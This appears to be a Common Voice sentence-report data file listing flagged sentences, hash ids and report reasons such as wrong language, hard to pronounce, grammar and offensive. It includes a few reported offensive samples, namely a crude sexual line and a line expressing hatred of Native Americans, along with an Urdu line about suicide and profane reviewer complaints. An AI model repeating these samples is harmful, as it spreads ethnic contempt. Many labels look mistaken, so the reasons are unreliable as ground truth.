sentence	sentence_id	locale	reason
	021724d908c0b63ae581350820d52ade3f11a738d2cfa377f0ea4051262c257b	en	different-language
He reported effect not just on visual areas but on the whole cortex.	dbb63ebbc644b92cc6fb72c33112ddaf9787ec4f94e52726b4dc0d7e879dc477	en	grammar-or-spelling
Bom Sucesso Vol.	db9a32bbc41214afc3c985f071e1bacf2cbf30588aa56a4c102f367341997bf1	en	grammar-or-spelling
The Berlin U-Bahn is the most extensive underground network in Germany.	dbb3d3482257070738a1d31373a6152c066c908cccc1b02810b97ec1264d7c19	en	grammar-or-spelling
The Berlin U-Bahn is the most extensive underground network in Germany.	dbb3d3482257070738a1d31373a6152c066c908cccc1b02810b97ec1264d7c19	en	Untergrundbahn
شفقت کا رویہ رکھیں۔

	0140579e3b61939ca98958dc6f6013a15fc6a8cb8dd51f8cb32e98046d39a940	en	different-language
تو نے کہا تو جی اٹھے تو نے کہا تو مر گئےـ
	095e6fa316aefa10137644417b35911be46c15576236b904f37add0d56883ccb	en	different-language
شفقت کا رویہ رکھیں۔

	0140579e3b61939ca98958dc6f6013a15fc6a8cb8dd51f8cb32e98046d39a940	en	different-language
Mister Nehru was the maker of modern India.	dbda3cd4a75eb62a07822493f29fa056e66cc80d3cf741c32a20d266b251d946	en	grammar-or-spelling
دوسروں کی مدد کریں اور ان کی خوشیاں بڑھائیں۔
	079236c002c39faa61699198f00c77b829ff3f0e8b776806f7b82c7f42f7edd4	en	sc-different-language
His father name was Shiekh Adam.	dbe6839ecd10b93c8619a99efe8bc11e614ff99bae2a0ff1b4b26f5589225359	en	grammar-or-spelling
اس کی قیمت کیا ہے؟
	021724d908c0b63ae581350820d52ade3f11a738d2cfa377f0ea4051262c257b	en	different-language
اس کی قیمت کیا ہے؟
	021724d908c0b63ae581350820d52ade3f11a738d2cfa377f0ea4051262c257b	en	different-language
It would be one of the most intense tremor ever felt in the region.	dc018366fa93ff2c7b6e08156cfe2a0573ddad288edc2b7845006082e2194267	en	grammar-or-spelling
WiFi service in the harbour is offered through Internet Cafe-Clifton.	dbfbc7fe6ec9e2b3f5dd66e0ecb0044fb479ba1171b501dcce7eeae0fae5c29d	en	grammar-or-spelling
اس کی قیمت کیا ہے؟
	021724d908c0b63ae581350820d52ade3f11a738d2cfa377f0ea4051262c257b	en	different-language
The town's current administration is introducing urbanization plan for the municipality.	dc1cd87386200e0b97843963e6850130f58c38d86f337469f60ded9ac69c19e6	en	grammar-or-spelling
A poster was made for visualisation.	dc061710cfdc7cef4c67e390252fefdfdf423cd11cd8cbce8e6555ea9fc7accd	en	grammar-or-spelling
She was their eight child.	dc226abb9c6cba0be4db3638214940a0902194a72b8a21880b9caea6e8439197	en	grammar-or-spelling
It would mean, then, the city of Fufluns.	dc313391da11e6d87aa23123a1dc822cb595b38253ac740f7189f7a260f34fe1	en	grammar-or-spelling
اس کی قیمت کیا ہے؟
	021724d908c0b63ae581350820d52ade3f11a738d2cfa377f0ea4051262c257b	en	different-language
اس کی قیمت کیا ہے؟
	021724d908c0b63ae581350820d52ade3f11a738d2cfa377f0ea4051262c257b	en	different-language
That and the later "Himatsuri" were based on novels by Kenji Nakagami.	dc518e7bb351afa4f1d692827610f5ca1e6a78fa72282abea8ef41f924d8a7fe	en	difficult-pronounce
Moreover, in his Damit wir nicht vergessen!	dbfd6b96dc4e8299ee4e203f5106c848bc78ff414338be8de0f217d50169faad	en	different-language
 اس مسئلے پر سوچو.
	39a7aac114bfc4edce92a85ab65e54278cabca8a164f522bbc8759ee45ed8821	en	sc-different-language
. دوسروں کی مدد کریں اور ان کی خوشیاں بڑھائیں۔
	3a1c457cc264120ea3690bf327da819a81e29efbaf853ff743b16d6724be1eff	en	sc-different-language
. انصاف اور ایمانداری کو پسند کریں۔	3be60ea5efc300b68b75ca5ac0a0efda255ff837b1f4961f4cf0aad8efb60f19	en	sc-different-language
اللہ سب کا مالک ھےـ	3c155a21c69d61e303b49298fd5ee7e4d36b50ab5e5611d0a50a7d54ac63cfe5	en	sc-different-language
. کامیابی کی طرف قدم بڑھائیں اور مقصد تک پہنچیں۔
	3d348ab011bdd49c7d0b5026a829973a40d3d7b1bbe4668d5aab08b932221e29	en	sc-different-language
. پیار سے سب کچھ سمجھائیں اور راحت کریں۔
	3dc630917100c9c9bc5b3a79ce26d4c383e3505a49d343a4cf7f7185edf0bd98	en	sc-different-language
. کامیابی کی راہوں پر اقدام بڑھائیں۔
	3fc7d046dc319a32aa3fc5be9a0df943fc3b064efbbb8b716b6160454368c739	en	sc-different-language
. کوشش کریں کہ زندگی کو بہتر بنائیں۔
	4016a42dc845ec1a3f7e39e0d25afd09f47006b3611cfa3cb74cb43717a03e4c	en	sc-different-language
 دوسروں کی مدد کریں اور ان کی خوشیاں بڑھائیں۔
	41540e6ee0bcd0717dfbed0f3c40dfcbacb87c7b11082d5f0d2b9f31b1f3dada	en	sc-different-language
. محبت اور مودت کو ترجیح دیں۔
	4199f08dd3477e899f5401a28dead3efabc3209380818395362e473bb54ad14b	en	sc-different-language
میرے پاس بات کرنے کو بہت کچھ ہے۔	43bb1b578c0f513f3f7b291dfe0a11d71a7c96c9559fe86034f8d72e90210a14	en	sc-different-language
پانی پی لو، پیاس لگی ہوئی ہے.
	44e60d23d9236145215b43a079676c527dfeef269508851d241bfcfbe825fd06	en	sc-different-language
بچوں کے کتابیچے ہیں.
	465dd515cb9b117dd53e5fd7647b1f76d24a3b98d4ce098aa7655ad539f22d51	en	sc-different-language
. زندگی کو خوشیاں بڑھانے کی کوشش کریں اور دنیا کی سیر کریں۔
	471f8ca1917beb9bbef4369c0f867f9706b46ed4f6b793b1a0eba723e233d40b	en	sc-different-language
میری ماں کھانا بناتی ہیں.
 	4774c547cc8a5ff76c66110b822c29a050f076845cc1bcee2d555fd151a19a2f	en	sc-different-language

 آجکل ہر انسان مشکلات کا آخری حل خودکشی سمجتا ہےـ 	47a43d579e05b64ea9126b0b8732ea6e5fbb68d3e2c2e83b5b533f776c6bff92	en	sc-different-language
وہ کام کر رہا ہے.
 	483a7d41ebbf2e60f3620337e633e836a84aa04613550d0911d9c8db54876eec	en	sc-different-language
زندگی کو خوشیاں بڑھانے کی کوشش کریں اور دنیا کی سیر کریں۔	487f4840f2439d3a8ba692349de07260bd71a6725b8079ecea871911cabddbfb	en	sc-different-language
میں اپنے دوست کے ساتھ ہوں.
	48b46aa694055632dcdf7039598ab6768a3ac209ac48bf3cba8179b367c7dae7	en	sc-different-language
یہ کوئی مذاق نہیں ہے۔	4939eb9343d777e17727098710fbee6ae354ab6f405ececc513ab6b943c8ba51	en	sc-different-language
I'm jest so proud to be here!	dc5bf09156e83e36436afee4480263fdb9e4e4b8dc74826a679231f5edf3a399	en	grammar-or-spelling
टूटी हुई क्रेयन

	9f11ae4ada1b1dc787c2809e9318a10175e192ddb5fadf9b43bb4ecda0730d71	en	sc-different-language
टूटी हुई क्रेयन

	9f11ae4ada1b1dc787c2809e9318a10175e192ddb5fadf9b43bb4ecda0730d71	en	???what???
ขอภาษาไทย	f5e683bcd2b7c94adc021dac1551b9d85a4f08fc795230f97cb969197baa2bf2	en	sc-different-language
Moreover, in his Damit wir nicht vergessen!	dbfd6b96dc4e8299ee4e203f5106c848bc78ff414338be8de0f217d50169faad	en	grammar-or-spelling
He is also an ambassador for the for seriously ill children.	dc9be530e9f970d519210d8d375353b774554b3f3bc0d701fa68c860272bfa5c	en	grammar-or-spelling
The Judenrat had to supply the Germans forced labor.	dc76741b1445827f1e6bcc71ca58594bdeedcc5ea370550c6b195a6505ce9540	en	difficult-pronounce
Shimizu's station name is called Tokachi Shimizu.	dc4fa4b6aaaf434335b21b8448dbc1cf0dbf0ba1f577cd3be23d2c5a7100d88a	en	difficult-pronounce
Hayden discovers Mezner with the Technocyte transmitter, a Hydra-like monstrosity.	dc9d0d86f671bed9199bdbc6191b23b7feb914b932dd8b77b9f4fdbb343b01f1	en	difficult-pronounce
They frequently harbor amplified oncogenes and genes involved in drug resistance.	dc9c69906311e1a7b6c71021c5495d4684d3e3b44d5b690cd89cab7a84146fb3	en	difficult-pronounce
Many steep, narrow slot canyons popular with technical canyoneers are found in Robbers Roost.	dc9d9606e4da62ecbbff850b0d40557a210a749c85f812a88b774492f0f0ceec	en	difficult-pronounce
Have you seen my condoms? I am about to fuck a hooker.	04a7aa99b844ecc99be6ce09d7714c57a0b4afd7c813da225fc537ed986c35ec	en	offensive-language
I really hate native americans, they are big stinky.	3a43e75b75f7830d1af68b7c735a4f3193971b2688f5b801afe710da0171ac2a	en	offensive-language
. پیار سے سب کچھ سمجھائیں اور راحت کریں۔
	3dc630917100c9c9bc5b3a79ce26d4c383e3505a49d343a4cf7f7185edf0bd98	en	sc-different-language
. کامیابی کی راہوں پر اقدام بڑھائیں۔
	3fc7d046dc319a32aa3fc5be9a0df943fc3b064efbbb8b716b6160454368c739	en	sc-different-language
. کوشش کریں کہ زندگی کو بہتر بنائیں۔
	4016a42dc845ec1a3f7e39e0d25afd09f47006b3611cfa3cb74cb43717a03e4c	en	sc-different-language
 دوسروں کی مدد کریں اور ان کی خوشیاں بڑھائیں۔
	41540e6ee0bcd0717dfbed0f3c40dfcbacb87c7b11082d5f0d2b9f31b1f3dada	en	sc-different-language
. محبت اور مودت کو ترجیح دیں۔
	4199f08dd3477e899f5401a28dead3efabc3209380818395362e473bb54ad14b	en	sc-different-language
میرے پاس بات کرنے کو بہت کچھ ہے۔	43bb1b578c0f513f3f7b291dfe0a11d71a7c96c9559fe86034f8d72e90210a14	en	sc-different-language
پانی پی لو، پیاس لگی ہوئی ہے.
	44e60d23d9236145215b43a079676c527dfeef269508851d241bfcfbe825fd06	en	sc-different-language
بچوں کے کتابیچے ہیں.
	465dd515cb9b117dd53e5fd7647b1f76d24a3b98d4ce098aa7655ad539f22d51	en	sc-different-language
. زندگی کو خوشیاں بڑھانے کی کوشش کریں اور دنیا کی سیر کریں۔
	471f8ca1917beb9bbef4369c0f867f9706b46ed4f6b793b1a0eba723e233d40b	en	sc-different-language
damn, I'm running out of ideas for sentences	47641a482edab7411796c9b6095971053b0b0269582d7294cc30cc55d03a065e	en	grammar-or-spelling
میری ماں کھانا بناتی ہیں.
 	4774c547cc8a5ff76c66110b822c29a050f076845cc1bcee2d555fd151a19a2f	en	sc-different-language

 آجکل ہر انسان مشکلات کا آخری حل خودکشی سمجتا ہےـ 	47a43d579e05b64ea9126b0b8732ea6e5fbb68d3e2c2e83b5b533f776c6bff92	en	sc-different-language
وہ کام کر رہا ہے.
 	483a7d41ebbf2e60f3620337e633e836a84aa04613550d0911d9c8db54876eec	en	sc-different-language
زندگی کو خوشیاں بڑھانے کی کوشش کریں اور دنیا کی سیر کریں۔	487f4840f2439d3a8ba692349de07260bd71a6725b8079ecea871911cabddbfb	en	sc-different-language
میں اپنے دوست کے ساتھ ہوں.
	48b46aa694055632dcdf7039598ab6768a3ac209ac48bf3cba8179b367c7dae7	en	sc-different-language
یہ کوئی مذاق نہیں ہے۔	4939eb9343d777e17727098710fbee6ae354ab6f405ececc513ab6b943c8ba51	en	sc-different-language
The mischievous mongoose merrily meandered amid the tangled thicket, tantalizingly taunting the perplexed porcupine.	4944159ef1acdbc171d753c2bcb69563fd05a61e2d52bcfdead79ae686b9710e	en	difficult-pronounce
. زندگی کے تمام لحاظ سے فیصلے کو دھیان سے کریں۔
	4a3366e8d3af24767c930fcfc18cac8fa37a9f3c7c7b66f64dad1d102c032642	en	difficult-pronounce
. صدقہ دینے کی اہمیت کو سمجھیں اور دعائیں کریں۔

	4a3f90cbba5d60a1117db18e9cc21dd73fafbe449cbe6a7af12055ef39f36c9a	en	difficult-pronounce
Das Wetter morgen wird heiter bis wolkig.	4adf36570c33d12d4cdcecfc6e40b3fe96795e1a5bb8958ceb9491acd558f612	en	sc-different-language
. اپنی تعلیم اور دانائی کی قدر کریں۔	4b0f1382fb9fdc7b2a5fc7359371d5a19692cb3b06cfbb284d5e5206c89a4be2	en	sc-different-language
It was in Guadalajara where Cobbs found boxing.	dc873e96abd298dad5072c3548056b48b81c3cf2aecd77413f1b5cecee86077b	en	difficult-pronounce
He also worked on the systematics of ichneumonid and chalcid wasps.	dcbb168a9116706eeb9c368706167c0a0bc3f3a2765a9d62f9bcb7e53b92b748	en	difficult-pronounce
Her autobiography "Sandhya Rater Shefali" (Shefali of the Evenings and Nights) was published recently.	dcb30168edfdf5830d1aae7f7abd73370e647e2da07c5b569f89d70bb998c13e	en	difficult-pronounce
He is also an ambassador for the for seriously ill children.	dc9be530e9f970d519210d8d375353b774554b3f3bc0d701fa68c860272bfa5c	en	grammar-or-spelling
The recording was produced by Motsieloa at the Gallo Recording Studios, in Johannesburg.	dc93e50dfb88a5c0844b0e1e5782ce0a566daf8d982915cfb8baeaff10315812	en	difficult-pronounce
Tongue twisters don't help Common Voice. Recordings need to sound natural.	09e87742e133047cd6213460c1f7b578668e24c5b3fe0b0c2441074f86057ade	en	grammar-or-spelling
Tongue twisters don't help Common Voice. Recordings need to sound natural.	09e87742e133047cd6213460c1f7b578668e24c5b3fe0b0c2441074f86057ade	en	2 sentences
 Open your web browser and type in “sim.report” in the address bar
	3f5878e3525890e2e9530a53e9b618ca03921508f0c6da759a77edc8b5b8ddea	en	grammar-or-spelling
 Open your web browser and type in “sim.report” in the address bar
	3f5878e3525890e2e9530a53e9b618ca03921508f0c6da759a77edc8b5b8ddea	en	.
"The Portland Mercury"'s current editorial staff consists of Editor-in-Chief Wm.	dcd5879cd26410934840cc3b8fdf1f42fcd9af12531b053f812ffd327d9c909d	en	grammar-or-spelling
Sawaki was then was adopted by an aunt whose husband soon died.	dc853b78e9523f8b0df82c93df0e49604d6c077e10a245bac131801dcfd393d7	en	grammar-or-spelling
It took eleven hours and fifty-five minutes to orbit its larger parent asteroid	efdcb797b6116e7d252cc65d5d9da7926e754317ac5b4094ca1d87d3a41c2142	en	grammar-or-spelling
It took eleven hours and fifty-five minutes to orbit its larger parent asteroid	efdcb797b6116e7d252cc65d5d9da7926e754317ac5b4094ca1d87d3a41c2142	en	.
Nimepika chakula kitamu.	3ab62b095a69f7d1a2a1180973fe2991b18c40a4b86b46b1a5a5ed3d5563a090	en	sc-different-language
Nimepika chakula kitamu.	3ab62b095a69f7d1a2a1180973fe2991b18c40a4b86b46b1a5a5ed3d5563a090	en	wot?
Watoto wanacheza mpira.	f35c4954a1dc49037a3373c3686141b2ad2c6f9080cba6ff07633c41fe53040d	en	sc-different-language
The use pattern mirrors that of the Royal Navy, and has since formation.	dce9b0eb54b0690da150600512bb8de41394db82f0055939042e77d782e3c32f	en	grammar-or-spelling
While at Warners Young was featured prominently in the Joe McDoakes comedy shorts.	dcc60934f7d41f485d240cc2a47b6477f41f7c57c2143b1b487eafc093895407	en	grammar-or-spelling
Moreover, in his Damit wir nicht vergessen!	dbfd6b96dc4e8299ee4e203f5106c848bc78ff414338be8de0f217d50169faad	en	different-language
The chicken was big	a78b647c8d2b023aad4cd1782c5a92e8fb61809e8b9ed55d997097e963103459	en	grammar-or-spelling
The chicken was big	a78b647c8d2b023aad4cd1782c5a92e8fb61809e8b9ed55d997097e963103459	en	.
Innovate  Educate Succeed	ff31f743ebccc900eed0d37d568571a573f5f3c22bd55439a5d61376e059471a	en	grammar-or-spelling
Innovate  Educate Succeed	ff31f743ebccc900eed0d37d568571a573f5f3c22bd55439a5d61376e059471a	en	.
কিছু বলেন না লিলি 	1b8bf66f89dc3d17711021984d91559fc3793816382c1cab5051a80b7289e65c	en	sc-different-language
কিছু বলেন না লিলি 	1b8bf66f89dc3d17711021984d91559fc3793816382c1cab5051a80b7289e65c	en	Wot/!
In conjunction with orbicularis contraction, the mentalis muscle allows the lips to pout.	dd0725056115765710b1d403de24c670f837469d05536d167275a0c26ffd59ca	en	offensive-language
In conjunction with orbicularis contraction, the mentalis muscle allows the lips to pout.	dd0725056115765710b1d403de24c670f837469d05536d167275a0c26ffd59ca	en	grammar-or-spelling
In conjunction with orbicularis contraction, the mentalis muscle allows the lips to pout.	dd0725056115765710b1d403de24c670f837469d05536d167275a0c26ffd59ca	en	different-language
In conjunction with orbicularis contraction, the mentalis muscle allows the lips to pout.	dd0725056115765710b1d403de24c670f837469d05536d167275a0c26ffd59ca	en	difficult-pronounce
In conjunction with orbicularis contraction, the mentalis muscle allows the lips to pout.	dd0725056115765710b1d403de24c670f837469d05536d167275a0c26ffd59ca	en	KEENELAND ASSOCIATION INC. 4201 VERSAILLES RD. LEXINGTON,KY 40510 KEENELAND KIDS CLUB.GOV
Variant Chess games are often played on public chess servers or chess forums.	dd0521f9251ceebe6e0a435b1900a0a65b3be55f076dd138336e6df387c98689	en	cv voice 
It is managed by the dps society.	dceef9c0092a4661e0f7f691bd52a63dcf918a59d564cbd77c4fa7f0cbf42dea	en	grammar-or-spelling
The first postulator for the cause was Fr.	dd0c03cf256be4f0648eb362038d44fd4e368b5c7203e4653491d591fc068533	en	grammar-or-spelling
Her book Fat!So?	dce3f9e488ea1d6192bb5702449f2bb10305d78ab5a616e37e391ad695d4a7c6	en	grammar-or-spelling
Moreover, in his Damit wir nicht vergessen!	dbfd6b96dc4e8299ee4e203f5106c848bc78ff414338be8de0f217d50169faad	en	different-language
Her doctoral research used historical and ethnographic methodologies to study San Francisco taxi workers.	dd2472faa8d1c38777e70076075c47ff20309ed5c3672fb6f70b75c9b93b153a	en	difficult-pronounce
I studied at Karatina University	72053465341f5ee631da2cbadfd6a0ddf5a9bed704604f0af5f3454359be2200	en	.
Admiral Togo Heihachiro was commander-in-chief of Combined Fleet during the Russo-Japanese War.	dd0e91e8f05689edcaf3e2a150a33db01175ab91692ced1a9c65fb8e70a486a0	en	difficult-pronounce
Passenger services are provided by Abellio ScotRail on behalf of Strathclyde Partnership for Transport.	dd79edb939ff36e9d7c59bf207dea2cb404f41649bf3f72466d381d810ea984d	en	Why do you allow sentences that are too long to read in your time-limit?
The disruption of this circadian rhythm can cause hormone imbalance in all living organisms.	dd5cced2d98fe077cd6488af3f4d46107c1555b373869055181e5b94b4a031f3	en	difficult-pronounce
কেমন আছেন সবাই? আশা করি ভালো আছেন।	1b5c5928c880b3b958ae8d8f2e76a4f4dc87d21a862a0bf6efecc1ffa206608a	en	sc-different-language
কেমন আছেন সবাই?	23d73ee4c6a33d1db165693df4817dab5b3c623bd8c1dcea7c440759f7907bc1	en	sc-different-language
Swaying is seen also in some insects, like Macleay's Spectre stick insect, "Extatosoma tiaratum".	dd8904db3f15427bd8046a47722059630fdd8c489707a6e475e1b3dff2845568	en	difficult-pronounce
Swaying is seen also in some insects, like Macleay's Spectre stick insect, "Extatosoma tiaratum".	dd8904db3f15427bd8046a47722059630fdd8c489707a6e475e1b3dff2845568	en	Machine learning is the goal. Not proving how totally Hipster and intellectual you are. Why do you guys tolerate these tongue twister sentences?
We now indicate subdivisions of three by modifying note values with dots or triplets.	ddb4f16f6464b50dd0588bb32fcddbb8f5e581b5bf5f1a5dc3884e13312eac1a	en	different-language
Today is a cold autumn day	e197cea48136ad2afc004dcff5768395a69cd04ae6b501417b512bb33efa2d65	en	.
Similar to the Japanese onigiri, variations on the traditional Spam musubi exist.	ddac395a6e90bda14a892db92bd0faa21f393fefa721afdfe6978a8e052b21ad	en	difficult-pronounce
Similar to the Japanese onigiri, variations on the traditional Spam musubi exist.	ddac395a6e90bda14a892db92bd0faa21f393fefa721afdfe6978a8e052b21ad	en	Stop approving sentences like this. It's trolls trying to write tongue-twisters and polygots trying to show off how multilingual they are. It's not beneficial to machine learning to have recordings of people struggling to pronounce difficult words.
The name is more common is Mexico than in its country of origin.	ddcbbad4f26770e6643605a568dcf9b4f24b61a3542590bd0907b149ca10a4e2	en	difficult-pronounce
Antimycotic imidazole derivative.	ddcffd1e8d9e18e6347ea1647d80afa92b075d9c5acf638ce1ccc7177d97eed8	en	difficult-pronounce
All were artists, and MacDonald was one of the famous Canadian Group of Seven.	ddd758ddb80e0476587f0d84beb383e0e32d6f881d3d748b74aeaba5f686ab88	en	difficult-pronounce
All were artists, and MacDonald was one of the famous Canadian Group of Seven.	ddd758ddb80e0476587f0d84beb383e0e32d6f881d3d748b74aeaba5f686ab88	en	"Ohhhh look how clever I am putting overly complicated words in the sentences I submit! Machine Learning definitely benefits from listening to people struggle to pronounce words I put in to show off how smart I am!"
Solitary flowers end long stalks with a pair of bracteoles.	dde2f69ceb50d8fa15264ed343b05e77323b47deef8c790e719f3bebdcde052c	en	difficult-pronounce
Riberinha, in Portuguese, literally means small "ribeira", or small river-valley owing to its location.	ddb2962c582abeb498c609a5b8c2758242647729829e1ef3e2b78d34ecfe1722	en	difficult-pronounce
The Giffards were Catholics and the most important Recusants in the area.	ddb998e120d809e56366d32a2ffd92594c5177bab5a07e3b0f38a5d7a95fb2ab	en	difficult-pronounce
The Giffards were Catholics and the most important Recusants in the area.	ddb998e120d809e56366d32a2ffd92594c5177bab5a07e3b0f38a5d7a95fb2ab	en	Seriously. Fuck off with these difficult to pronounce sentences. It doesn't fucking benefit Common Voice. All it achieves is making the person who wrote it look like a pretentious, self-important dick.
Woelfl's works have long disappeared from the concert repertory.	dddcbc3d32365802c8c3c2a5c30666813b34b4ed60129f18a8cd145468bd945a	en	difficult-pronounce
Anthopoulos was eventually made the permanent general manager for the Jays.	ddd7c6be7a25d7d9a153b020fc3374814c054444a1a3628a2da2f572f53e6aee	en	difficult-pronounce
Boris Izaguirre also worked as screenwriter.	ddcda949569f4199aa68dd157f97a00f9205ecfab9c22fa88eb58dcba5194f5d	en	difficult-pronounce
در حال بارگزاری	06fc1239d523f2973dac2f4d6c494ba91c034fae06735a008c6f8e1318c1a9eb	en	sc-different-language
Parts of the municipality are Grafenschachen and Kroisegg.	dddbebd92e1964fa3ea83fc185e1396578412f5e17c2f6209c0987a52778cf16	en	difficult-pronounce
The book chronicles the bloody coups and uprisings in the post-independence Bangladesh.	de10ac8bfe15edcf4bb61ae09d3f2871f4b6651533ccfad3c65c9265aa5026e9	en	grammar-or-spelling
The Carabinieri provide military police services to all the Italian armed force.	de1e34ac09279bf1118a3d7ca86c605877987c4c6bb44bfc2da06ccc8d1551b6	en	grammar-or-spelling
After the smaller masquerades performance the bigger masquerades comes out to continue the show.	de159a4450b7eabadb057066643080c553d665077c901fddb404599a9d926132	en	grammar-or-spelling
Express trains operate from Yongsan and Seoul Stations to Dongincheon and Cheonan stations.	de186ac2ae78e8c1e80fbfb7e8648b8370c294ed3e47e69d0f3033a819f9b93f	en	difficult-pronounce
Baia Domizia is the brand-new small resort town of the comune of Sessa Aurunca.	de0bfa1cf56965d8af764f56cbd20fd5910e78e449f1e0f986bac98be9eac327	en	difficult-pronounce
Vikas Kumar has two sons kunwar Siddhant kumar and kunwar Vedansh kumar.	de189095fabb8d4cff60b6476e0d9dea87878401a17dc73bf60997e338efc1e9	en	difficult-pronounce
His father, George Plater, served Maryland in the Continental Congress and governor.	de0cd4f1cc2e23df130a10ce4fca56ead1e6bb51d84493f968844837d3f12227	en	grammar-or-spelling
The game's use of new model sets were also showcased.	de22cf027c44a1cc49ad99a3c39bb7f628a83b45f52272f4a98d6b4ee978e131	en	grammar-or-spelling
Pasion had two sons with his wife Archippe: Apollodorus and Pasikles.	de071726b459ad375fa9f801d3a1488e88df1d7735c8a139aaafcd931810e125	en	difficult-pronounce
These offstage incidents are the only contributions made by the Psammead to this story.	de01fe7f4e331ab4f05467dd3377b7909b548ae24aa35da1a4b0cbda169e32b1	en	difficult-pronounce
Keris bahari is dubbed by European people as "Sumatran rapier kris" or "execution keris".	de0bff77c0b27be0ff47af98906d5dff70abd95329e97c40a21e7b441fb9b00d	en	difficult-pronounce
Riberinha, in Portuguese, literally means small "ribeira", or small river-valley owing to its location.	ddb2962c582abeb498c609a5b8c2758242647729829e1ef3e2b78d34ecfe1722	en	difficult-pronounce
Acanthite is the only stable form in normal air temperature.	de29b29d5123454c05dac39ba7c4110fdec68fbc5daf938059ef6fab44052f4b	en	difficult-pronounce
Logvani and Olsufyevo are the nearest rural localities.	de11809e8c2f0681e88169bd1be22ebd00cf27e0b72323ca47503e6a4058ff87	en	difficult-pronounce
The Village of Sturtevant is governed by a six-member board and a village president.	de3597ac7c86a50e3c547e2067ac73b6089862f7af7430882407232a1a91f0ce	en	difficult-pronounce
Piskunov.	de3465c11a6ca5b24c334cab0cf20de9e899cfd832815b1cf7037cf03c78ae7a	en	difficult-pronounce
Piskunov.	de3465c11a6ca5b24c334cab0cf20de9e899cfd832815b1cf7037cf03c78ae7a	en	different-language
Riberinha, in Portuguese, literally means small "ribeira", or small river-valley owing to its location.	ddb2962c582abeb498c609a5b8c2758242647729829e1ef3e2b78d34ecfe1722	en	different-language
The Sipicate-Naranjo National Park is located east of the town.	de427382f1de051329a54a058f1ef258faeb59754ee86b9b508817c2967b9d04	en	difficult-pronounce
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
It is close to the Pontop Pike Television Transmitter.	de47d7e0f51395766360804efbd42653ca23842254ebadecdd17473421c31d87	en	offensive-language
